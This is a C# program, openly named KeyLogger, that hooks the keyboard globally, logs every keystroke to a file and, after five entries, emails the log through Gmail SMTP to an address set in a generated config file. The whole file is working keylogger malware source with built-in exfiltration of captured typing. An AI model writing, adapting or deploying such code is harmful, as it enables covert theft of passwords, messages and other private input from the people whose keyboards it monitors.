using System;
using System.Linq;
using SharpHook;
using SharpHook.Reactive;
using MailKit;
using MimeKit;
using MailKit.Net.Smtp;

namespace KeyLogger
{
    class Program
    {
        private static string exePath = Environment.CurrentDirectory;
        private static string logFolder = Path.Join(exePath, "KLogs");
        private static string logFile = Path.Join(logFolder, "Log.klog");
        private static string configFile = Path.Join(logFolder, "KL.conf");
        private static string[] defaultConf = new string[]
        {
            "#Enter Sending Email Below",
            "example@mail.com",
            "#Enter Password Below",
            "password123",
            "#Enter Recieving Email Below",
            "example2@mail.com"
        };
        private static string recorded = "";
        private static bool _cancelled = false;
        private static bool isShiftDown = false;
        public static void Main(string[] args)
        {
            Console.CancelKeyPress += new ConsoleCancelEventHandler(Console_CancelKeyPress);
            if(!Directory.Exists(logFolder))
            {
                Directory.CreateDirectory(logFolder);
            }
            if(!File.Exists(logFile))
            {
                var file = File.Create(logFile);
                file.Close();
            }
            if(!File.Exists(configFile))
            {
                var file = File.Create(configFile);
                file.Close();
                Console.WriteLine("No Config File Found");
                Console.WriteLine("New One Generated At: " + configFile);
                File.WriteAllLines(configFile, defaultConf);
                Environment.Exit(1);
            }
            var hook = new SimpleReactiveGlobalHook();
            hook.KeyPressed.Subscribe(KeyPressed);
            hook.KeyReleased.Subscribe(KeyReleased);
            hook.RunAsync();
            while(!_cancelled)
            {

            }
            hook.Dispose();
            
        }

        private static void KeyReleased(KeyboardHookEventArgs key)
        {
            string releasedKey = key.Data.KeyCode.ToString();
            releasedKey = releasedKey.Remove(0,2);
            if(isShiftDown && releasedKey.Contains("Shift"))
            {
                isShiftDown = false;
            }
        }

        private static void KeyPressed(KeyboardHookEventArgs key)
        {
            string keyPressed = key.Data.KeyCode.ToString();
            keyPressed = keyPressed.Remove(0,2);
            if(keyPressed.Contains("Shift"))
            {
                isShiftDown = true;
                return;
            }
            if(keyPressed == "Space")
            {
                keyPressed = " ";
            }
            Console.WriteLine(keyPressed);
            if(keyPressed == "Enter")
            {
                SaveFile();
            }else 
            {
                if(keyPressed.Length > 1)
                {
                    keyPressed = " (" + keyPressed + ") ";
                }
                if(!isShiftDown)
                {
                    recorded += keyPressed.ToLower();

                }else
                {
                    recorded += keyPressed;
                }
            }
        }
        private static void SaveFile()
        {
            Console.WriteLine(recorded);
            string[] prevLog = File.ReadAllLines(logFile);
            List<string> newLog = new List<string>();
            foreach(string data in prevLog)
            {
                newLog.Add(data);
            }
            newLog.Add(recorded);
            File.WriteAllLines(logFile, newLog);
            recorded = "";
            if(newLog.Count >= 5)
            {
                SendEmail();
            }
        }
        private static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            //Console.WriteLine("Cancelling");
            if (e.SpecialKey == ConsoleSpecialKey.ControlC)
            {
                _cancelled = true;
                e.Cancel = true;
            }
        }
        private static void SendEmail()
        {
            string payload = "";
            DateTime now = DateTime.Now;
            payload += now.ToString("F") + "\n";
            string[] fileContent = File.ReadAllLines(logFile);
            foreach(string data in fileContent)
            {
                payload += data + "\n";
            }
            List<string> emailConf = new List<string>();
            string[] conf = File.ReadAllLines(configFile);
            foreach(string prop in conf)
            {
                if(prop[0] != '#')
                {
                    emailConf.Add(prop);
                }
            }
            MimeMessage msg = new MimeMessage();
            msg.From.Add(new MailboxAddress("Logger",emailConf[0]));
            msg.To.Add(MailboxAddress.Parse(emailConf[2]));
            msg.Subject = "Keyboard Log";
            msg.Body = new TextPart("plain")
            {
                Text = payload
            };

            string emailAddress = emailConf[0];
            string password = emailConf[1];

            SmtpClient client = new SmtpClient();
            try
            {
                client.Connect("smtp.gmail.com", 465, true);
                client.Authenticate(emailAddress,password);
                client.Send(msg);

                Console.WriteLine("Email Sent");
                File.WriteAllText(logFile, "");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
            finally
            {
                client.Disconnect(true);
                client.Dispose();
            }
        }
    }
}